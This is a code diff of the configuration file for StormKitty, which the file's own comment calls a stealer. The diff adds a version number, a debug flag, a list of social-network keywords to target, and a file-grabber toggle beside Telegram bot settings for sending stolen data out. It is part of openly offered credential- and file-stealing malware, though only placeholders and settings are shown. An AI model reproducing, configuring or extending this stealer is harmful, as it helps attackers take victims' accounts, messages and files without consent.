@@ -1,10 +1,19 @@
-﻿using StormKitty.Implant;
+﻿/* 
+    Author : LimerBoy
+    Github : github.com/LimerBoy/StormKitty
+*/
+
+using StormKitty.Implant;
 using System.Collections.Generic;
 
 namespace StormKitty
 {
     internal sealed class Config
     {
+        // Stealer version
+        public static string Version = "1.3";
+        // Debug mode (write all exceptions to file)
+        public static string DebugMode = "--- Debug ---";
         // Telegram bot API key
         public static string TelegramAPI = "--- Telegram API ---";
         // Telegram chat ID
@@ -63,8 +72,13 @@ namespace StormKitty
         public static string[] PornServices = new string[] {
             "porn", "sex", "hentai", "порно", "sex"
         };
+        // Social networks
+        public static string[] SocialServices = new string[] {
+            "facebook", "vk.com", "ok.ru", "instagram", "whatsapp", "twitter", "gmail", "linkedin", "viber", "skype", "reddit", "flickr", "youtube", "pinterest",
+        };
 
-        // File grabber max size:
+        // File grabber:
+        public static string GrabberModule = "--- Grabber ---";
         public static int GrabberSizeLimit = 5120; // 5MB
         // Grabber file types:
         public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
